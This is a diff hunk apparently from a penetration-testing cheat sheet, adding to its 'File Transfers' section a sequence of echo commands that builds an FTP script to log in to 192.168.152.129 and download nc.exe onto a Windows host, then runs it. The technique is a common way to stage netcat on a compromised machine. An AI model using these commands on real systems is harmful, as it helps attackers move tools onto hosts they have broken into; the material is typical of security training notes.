@@ -1128,6 +1128,14 @@ File Transfers
         chown -R ftpuser:ftpgroup /ftphome/  
           
         /etc/init.d/pure-ftpd restart
+        
+        echo open 192.168.152.129 21 > ftp.txt
+        echo USER offsec >> ftp.txt
+        echo password >> ftp.txt
+        echo bin >> ftp.txt
+        echo GET nc.exe >> ftp.txt
+        echo bye >> ftp.txt
+        ftp -v -n -s:ftp.txt
 
 -   Packing Files
     -------------------------------------------------------------------------------------------------------------
